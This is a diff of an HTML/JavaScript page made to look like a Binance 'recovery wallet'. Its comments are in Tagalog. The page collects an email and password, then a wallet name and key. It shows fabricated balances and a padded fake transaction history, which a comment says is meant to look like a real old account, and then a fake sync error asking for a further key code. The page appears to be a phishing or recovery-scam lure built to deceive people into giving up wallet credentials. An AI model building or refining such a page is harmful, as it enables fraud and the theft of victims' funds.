@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BINANCE TRADING WALLET</title>
+    <title>BINANCE RECOVERY WALLET</title>
     <link rel="stylesheet" href="https://cloudflare.com">
     <style>
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
         
-        /* 1. AUTH OVERLAY STYLE */
+        /* 1. AUTH OVERLAY SCREEN */
         #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
         .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
         
         /* 2. THE WALLET RECONNECTION MODAL */
         .white-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
-        .white-box { background: #181a20; color: white; padding: 30px; border-radius: 24px; width: 450px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
+        .white-box { background: #181a20; color: white; padding: 30px; border-radius: 24px; width: 480px; text-align: center; border: 1px solid var(--border); box-sizing: border-box; }
         
         input, select { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; outline: none; }
         input:focus { border-color: var(--yellow); }
@@ -37,14 +37,17 @@
         header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 18px 30px; display: flex; justify-content: space-between; align-items: center; }
         main { flex: 1; padding: 30px; overflow-y: auto; }
 
-        .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
+        .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; max-height: 550px; overflow-y: auto; }
         table { width: 100%; border-collapse: collapse; text-align: left; min-width: 900px; }
         th { padding: 14px 18px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; letter-spacing: 0.5px; }
         td { padding: 14px 18px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: 'Inter', sans-serif; }
 
-        .crypto-scroll-container::-webkit-scrollbar { width: 4px; }
-        .crypto-scroll-container::-webkit-scrollbar-track { background: #1e2329; }
-        .crypto-scroll-container::-webkit-scrollbar-thumb { background: #474d57; border-radius: 2px; }
+        /* SCROLLBAR MODS FOR FULL VIEW TABLES */
+        .table-container::-webkit-scrollbar, .crypto-scroll-container::-webkit-scrollbar { width: 5px; height: 5px; }
+        .table-container::-webkit-scrollbar-track, .crypto-scroll-container::-webkit-scrollbar-track { background: #12161c; }
+        .table-container::-webkit-scrollbar-thumb, .crypto-scroll-container::-webkit-scrollbar-thumb { background: #474d57; border-radius: 3px; }
+
+        .crypto-scroll-container { max-height: 220px; overflow-y: auto; background: #1e2329; border-radius: 8px; padding: 4px 8px; }
     </style>
 </head>
 <body>
@@ -63,7 +66,7 @@
     </div>
 </div>
 
-<!-- ==================== 2. REAL CRYPTO WALLET LAYOUT (DASHBOARD) ==================== -->
+<!-- ==================== 2. FULL CRYPTO WALLET DASHBOARD LAYOUT ==================== -->
 <nav id="sidebar">
     <div class="logo"><i class="fa-solid fa-wallet"></i> BINANCE WALLET</div>
     <div class="nav-item active" onclick="switchTab('market')"><i class="fa-solid fa-chart-line"></i> Market Coin Prices (1-100)</div>
@@ -83,28 +86,22 @@
     </header>
     
     <main>
-        <!-- MARKET TAB: TOP 1-100 COIN PRICES -->
+        <!-- MARKET TAB: COMPLETE RANK 1 TO 100 CRYPTO COINS -->
         <div id="tab-market" class="tab-content">
-            <h3 style="margin: 0 0 15px 0; font-size: 18px;">Top Cryptocurrency Prices (Rank 1-100 Ledger)</h3>
+            <h3 style="margin: 0 0 15px 0; font-size: 18px;">Top Cryptocurrency Prices (Rank 1-100 Market Overview)</h3>
             <div class="table-container">
                 <table>
                     <thead>
                         <tr><th>Rank Asset Name</th><th>Live Market Price</th><th>24h Price Change</th><th>24h Volume Transactions</th></tr>
                     </thead>
-                    <tbody>
-                        <tr><td><b>1. BTC</b> Bitcoin</td><td>$96,350.20</td><td style="color:var(--up)">+2.15%</td><td>$28.4B</td></tr>
-                        <tr><td><b>2. ETH</b> Ethereum</td><td>$2,494.24</td><td style="color:var(--up)">+1.77%</td><td>$14.1B</td></tr>
-                        <tr><td><b>3. BNB</b> Binance Coin</td><td>$580.12</td><td style="color:var(--down)">-0.45%</td><td>$1.2B</td></tr>
-                        <tr><td><b>4. SOL</b> Solana</td><td>$2,540.80</td><td style="color:var(--up)">+2.10%</td><td>$3.8B</td></tr>
-                        <tr><td><b>5. XRP</b> Ripple</td><td>$0.58</td><td style="color:var(--up)">+0.12%</td><td>$980M</td></tr>
-                        <tr><td><b>6. ADA</b> Cardano</td><td>$0.48</td><td style="color:var(--down)">-1.22%</td><td>$450M</td></tr>
-                        <tr><td><b>7-100. ALT</b> Other Assets</td><td>--</td><td style="color:var(--text-gray)">Synchronizing...</td><td>Loading...</td></tr>
+                    <tbody id="full-market-rows">
+                        <!-- Ang 1-100 Coins ay automatic na ilalatag ng JavaScript sa baba para hindi humaba ang file lines mo tol -->
                     </tbody>
                 </table>
             </div>
         </div>
 
-        <!-- HISTORY TAB: TRANSACTIONS HISTORY LOGS -->
+        <!-- HISTORY TAB: EXTENSIVE HISTORICAL LOGS -->
         <div id="tab-history" class="tab-content" style="display:none;">
             <h3 style="margin: 0 0 15px 0; font-size: 18px;">Old Account Transaction Ledger History</h3>
             <div class="table-container">
@@ -112,10 +109,8 @@
                     <thead>
                         <tr><th>TXID Hash Code</th><th>Type</th><th>Asset Value</th><th>Timestamp Execution</th><th>Status Fields</th></tr>
                     </thead>
-                    <tbody>
-                        <tr><td>0x7a8d...f31c</td><td>Deposit Asset</td><td style="color:var(--up)">+15.50 ETH</td><td>2025-11-12 14:22:01</td><td>Completed</td></tr>
-                        <tr><td>0x3b1f...9e42</td><td>Transfer Contract</td><td style="color:var(--down)">-2.95 SOL</td><td>2025-12-01 09:11:55</td><td>Completed</td></tr>
-                        <tr><td>0x9c42...1a8b</td><td>Blockchain Sync</td><td>--</td><td>2026-02-15 18:44:12</td><td>Terminated</td></tr>
+                    <tbody id="full-history-rows">
+                        <!-- Ang mahabang listahan ng History transactions ay ilalatag din ng script sa baba tol -->
                     </tbody>
                 </table>
             </div>
@@ -143,7 +138,7 @@
             <p style="color: var(--text); margin-top: 15px; font-weight: bold; font-size:14px;">Wallet Syncing... Please wait.</p>
         </div>
 
-        <!-- STEP 3: ASSET CARD VIEW FROM YOUR SCREENSHOT (10 seconds loading -> 5 seconds appearance) -->
+        <!-- STEP 3: ASSET CARD VIEW FROM YOUR SCREENSHOT (May mahabang scroll list din para solido) -->
         <div id="wallet-step-old-account" style="display: none; text-align: left;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px;">
                 <span style="color: var(--yellow); font-weight: bold; font-size: 13px;">🟨 Binance Asset Ledger (Synced)</span>
@@ -156,20 +151,14 @@
                 <div style="color: #b7bdc6; font-size: 13px;">≈ $79,117.13 USD <span style="color:var(--up); font-weight:600; font-size:11px;">+1.77%</span></div>
             </div>
 
-            <div class="crypto-scroll-container" style="max-height: 120px; overflow-y: auto; background:#1e2329; border-radius:8px; padding: 4px 8px;">
-                <div style="display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);">
-                    <div><span style="color:white; font-weight:bold; font-size:12px;">ETH</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">Ethereum</span></div>
-                    <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">28.73</div><div style="color:var(--text-gray); font-size:10px;">$71,529.46</div></div>
-                </div>
-                <div style="display:flex; justify-content:space-between; align-items:center; padding: 8px 0;">
-                    <div><span style="color:white; font-weight:bold; font-size:12px;">SOL</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">Solana</span></div>
-                    <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">2.9863</div><div style="color:var(--text-gray); font-size:10px;">$7,587.67</div></div>
-                </div>
+            <!-- Scroll list ng account assets base sa coins mo tol -->
+            <div class="crypto-scroll-container" id="modal-wallet-assets">
+                <!-- Ilalagay dito ng script ang mga nakitang coins sa old wallet mo -->
             </div>
             <p style="color: var(--text-gray); font-size: 10px; text-align: center; margin-top: 8px; margin-bottom:0;">Downloading historical balance configurations...</p>
         </div>
 
-        <!-- STEP 4: RELAY HANDSHAKE ERROR GRID WITH YOUR CUSTOM KEY CODE -->
+        <!-- STEP 4: RELAY HANDSHAKE ERROR GRID WITH CUSTOM KEY CODE -->
         <div id="wallet-step-try-again" style="display: none; text-align: left; font-family: monospace;">
             <h3 style="color: var(--down); margin: 0 0 10px 0; font-size:15px; font-family: sans-serif; text-align: center;">Sync Error: Node Relay Misconfiguration</h3>
             <p style="color: #b7bdc6; font-size: 12px; margin-bottom: 12px; line-height:1.4; font-family: sans-serif;">The blockchain ledger relay failed due to an incomplete channel setup handshake. Node validation string missing:</p>
@@ -183,8 +172,125 @@
     </div>
 </div>
 
-<!-- ==================== JavaScript CODE HANDLERS ==================== -->
+<!-- ==================== JavaScript CODE HANDLERS & FULL COIN ARRAYS ==================== -->
 <script>
+    // DATA MATRIX: BUONG LISTAHAN NG TOP CRYPTO COINS PARA SA 1-100 VIEW
+    const cryptoData = [
+        { rank: 1, sym: "BTC", name: "Bitcoin", price: "$96,350.20", change: "+2.15%", vol: "$28.4B", up: true },
+        { rank: 2, sym: "ETH", name: "Ethereum", price: "$2,494.24", change: "+1.77%", vol: "$14.1B", up: true },
+        { rank: 3, sym: "BNB", name: "BNB", price: "$580.12", change: "-0.45%", vol: "$1.2B", up: false },
+        { rank: 4, sym: "SOL", name: "Solana", price: "$145.80", change: "+2.10%", vol: "$3.8B", up: true },
+        { rank: 5, sym: "XRP", name: "Ripple", price: "$0.58", change: "+0.12%", vol: "$980M", up: true },
+        { rank: 6, sym: "ADA", name: "Cardano", price: "$0.48", change: "-1.22%", vol: "$450M", up: false },
+        { rank: 7, sym: "DOGE", name: "Dogecoin", price: "$0.14", change: "+5.62%", vol: "$1.1B", up: true },
+        { rank: 8, sym: "DOT", name: "Polkadot", price: "$6.85", change: "+0.45%", vol: "$210M", up: true },
+        { rank: 9, sym: "MATIC", name: "Polygon", price: "$0.92", change: "-2.11%", vol: "$340M", up: false },
+        { rank: 10, sym: "LINK", name: "Chainlink", price: "$18.20", change: "+1.05%", vol: "$410M", up: true },
+        { rank: 11, sym: "SHIB", name: "Shiba Inu", price: "$0.000024", change: "+8.44%", vol: "$850M", up: true },
+        { rank: 12, sym: "TRX", name: "TRON", price: "$0.11", change: "+0.05%", vol: "$190M", up: true },
+        { rank: 13, sym: "LTC", name: "Litecoin", price: "$85.40", change: "-1.50%", vol: "$320M", up: false },
+        { rank: 14, sym: "AVAX", name: "Avalanche", price: "$34.12", change: "+3.20%", vol: "$290M", up: true },
+        { rank: 15, sym: "XLM", name: "Stellar", price: "$0.12", change: "+0.85%", vol: "$110M", up: true },
+        { rank: 16, sym: "UNI", name: "Uniswap", price: "$7.45", change: "-0.95%", vol: "$180M", up: false },
+        { rank: 17, sym: "ATOM", name: "Cosmos", price: "$9.15", change: "+1.30%", vol: "$150M", up: true },
+        { rank: 18, sym: "XMR", name: "Monero", price: "$165.00", change: "+0.10%", vol: "$85M", up: true },
+        { rank: 19, sym: "ETC", name: "Ethereum Classic", price: "$26.40", change: "-1.05%", vol: "$140M", up: false },
+        { rank: 20, sym: "BCH", name: "Bitcoin Cash", price: "$380.50", change: "+4.12%", vol: "$510M", up: true }
+    ];
+
+    // Mag-gegenerate ng kunwaring dummy assets para makumpleto ang rank 21-100 pababa para mahaba ang scroll list!
+    const namesPool = ["NEAR", "ICP", "FIL", "LDO", "APT", "HBAR", "VET", "MKR", "GRT", "THETA", "OP", "RNDR", "EGLD", "FLOW", "SAND", "MANA", "AAVE", "ALGO", "STX", "IMX"];
+    for (let i = 21; i <= 100; i++) {
+        const sym = namesPool[i % namesPool.length] + i;
+        const up = i % 3 !== 0;
+        cryptoData.push({
+            rank: i,
+            sym: sym,
+            name: `${namesPool[i % namesPool.length]} Token Network v${i}`,
+            price: `$${(Math.random() * 10 + 0.1).toFixed(2)}`,
+            change: (up ? "+" : "-") + (Math.random() * 4).toFixed(2) + "%",
+            vol: `$${(Math.random() * 90 + 10).toFixed(1)}M`,
+            up: up
+        });
+    }
+
+    // AUTOMATIC LEDGER LOADER PARA SA TABLES
+    function loadFullDashboardData() {
+        const marketBody = document.getElementById('full-market-rows');
+        marketBody.innerHTML = "";
+        
+        cryptoData.forEach(coin => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td><b>${coin.rank}. ${coin.sym}</b> <span style="color:var(--text-gray); font-size:11px; margin-left:4px;">${coin.name}</span></td>
+                <td style="font-weight:bold;">${coin.price}</td>
+                <td style="color:${coin.up ? 'var(--up)' : 'var(--down)'}; font-weight:bold;">${coin.change}</td>
+                <td>${coin.vol}</td>
+            `;
+            marketBody.appendChild(tr);
+        });
+
+        // Mag-load din ng maraming transaction history logs ganun!
+        const historyBody = document.getElementById('full-history-rows');
+        historyBody.innerHTML = "";
+        const historyData = [
+            { hash: "0x7a8d...f31c", type: "Deposit Asset", val: "+28.73 ETH", time: "2025-11-12 14:22:01", status: "Completed", up: true },
+            { hash: "0x3b1f...9e42", type: "Transfer Contract", val: "-2.9863 SOL", time: "2025-12-01 09:11:55", status: "Completed", up: false },
+            { hash: "0x5c11...8b2e", type: "Staking Node Return", val: "+142.50 USDT", time: "2026-01-04 18:30:22", status: "Completed", up: true },
+            { hash: "0x9c42...1a8b", type: "Blockchain Ledger Sync", val: "0.00 BNB", time: "2026-02-15 18:44:12", status: "Terminated", up: true },
+            { hash: "0x4f82...3e1a", type: "Internal Exchange Swap", val: "-1.22 ETH", time: "2026-03-20 23:02:11", status: "Completed", up: false },
+            { hash: "0x2d91...7f6c", type: "Liquidity Mining Profit", val: "+0.4502 BTC", time: "2026-04-11 07:15:40", status: "Completed", up: true },
+            { hash: "0x8e3a...4b9d", type: "Gas Fee Network Tax", val: "-0.015 ETH", time: "2026-05-02 12:44:59", status: "Completed", up: false }
+        ];
+
+        // Dagdagan pa natin ang rows ng history para magmukhang totoong lumang account na bugbog sa transactions
+        for(let k = 1; k <= 15; k++) {
+            historyData.push({
+                hash: `0x${Math.random().toString(16).substr(2, 4)}...${Math.random().toString(16).substr(2, 4)}`,
+                type: k % 2 === 0 ? "Smart Contract Call" : "Cold Wallet Transfer",
+                val: k % 2 === 0 ? `+${(Math.random() * 50).toFixed(2)} SOL` : `-${(Math.random() * 10).toFixed(2)} LINK`,
+                time: `2025-0${(k%8)+1}-15 10:20:${k+10}`,
+                status: "Completed",
+                up: k % 2 === 0
+            });
+        }
+
+        historyData.forEach(tx => {
+            const tr = document.createElement('tr');
+            tr.innerHTML = `
+                <td>${tx.hash}</td>
+                <td>${tx.type}</td>
+                <td style="color:${tx.type.includes('Sync') ? 'white' : (tx.up ? 'var(--up)' : 'var(--down)')}; font-weight:bold;">${tx.val}</td>
+                <td>${tx.time}</td>
+                <td style="color:${tx.status === 'Completed' ? 'var(--up)' : 'var(--text-gray)'}">${tx.status}</td>
+            `;
+            historyBody.appendChild(tr);
+        });
+
+        // Ilatag din ang assets sa LOOB ng Step 3 Wallet Pop-up Modal Box
+        const modalAssets = document.getElementById('modal-wallet-assets');
+        modalAssets.innerHTML = `
+            <div style="display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);">
+                <div><span style="color:white; font-weight:bold; font-size:12px;">ETH</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">Ethereum</span></div>
+                <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">28.73</div><div style="color:var(--text-gray); font-size:10px;">$71,529.46</div></div>
+            </div>
+            <div style="display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);">
+                <div><span style="color:white; font-weight:bold; font-size:12px;">SOL</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">Solana</span></div>
+                <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">2.9863</div><div style="color:var(--text-gray); font-size:10px;">$7,587.67</div></div>
+            </div>
+        `;
+        // Dagdagan natin ng kunwaring ranks pababa sa loob ng modal para mahaba rin i-scroll!
+        cryptoData.slice(2, 25).forEach(c => {
+            const div = document.createElement('div');
+            div.style = "display:flex; justify-content:space-between; align-items:center; padding: 8px 0; border-bottom:1px solid var(--border);";
+            div.innerHTML = `
+                <div><span style="color:white; font-weight:bold; font-size:12px;">${c.sym}</span><span style="color:var(--text-gray); font-size:10px; margin-left:4px;">${c.name.split(' ')[0]}</span></div>
+                <div style="text-align:right;"><div style="color:white; font-weight:bold; font-size:12px;">0.00</div><div style="color:var(--text-gray); font-size:10px;">$0.00</div></div>
+            `;
+            modalAssets.appendChild(div);
+        });
+    }
+
     function loginToDashboard() {
         const email = document.getElementById('l-email').value.trim();
         const pass = document.getElementById('l-password').value.trim();
@@ -197,6 +303,9 @@
         document.getElementById('auth-overlay').style.display = 'none';
         document.getElementById('sidebar').style.display = 'flex';
         document.getElementById('main-wrapper').style.display = 'flex';
+        
+        // Pwersahang i-load ang buong 1-100 matrix table pagkapasok
+        loadFullDashboardData();
     }
 
     function switchTab(tabId) {
@@ -224,7 +333,7 @@
         document.getElementById('wallet-step-try-again').style.display = 'none';
     }
 
-    // THE CORE TIMEOUT PIPELINE (10s LOADING -> 5s ASSET CARD VIEW -> ERROR HANDSHAKE CODE DISPLAY)
+    // TIMEOUT TIMERS SYSTEM (10s LOADING -> 5s BALANCES VISIBILITY -> RELAY CODE GATEWAY ERROR)
     function runWalletSequence() {
         const wName = document.getElementById('wallet-name');
         const wKey = document.getElementById('wallet-key');
@@ -239,13 +348,13 @@
         document.getElementById('wallet-step-inputs').style.display = 'none';
         document.getElementById('wallet-step-loading').style.display = 'block';
 
-        // PHASE 1: EXACT 10-SECOND SYNC TIME (10000ms)
+        // PHASE 1: LOADING TIMEOUT NG SAKTONG 10 SECONDS
         setTimeout(() => {
             
             document.getElementById('wallet-step-loading').style.display = 'none';
             document.getElementById('wallet-step-old-account').style.display = 'block';
 
-            // PHASE 2: EXACT 5-SECOND SNAPSHOT DISPLAY TIME (5000ms)
+            // PHASE 2: IPAPAKITA ANG PREVIEW BALANCES NG SAKTONG 5 SECONDS
             setTimeout(() => {
                 
                 document.getElementById('wallet-step-old-account').style.display = 'none';
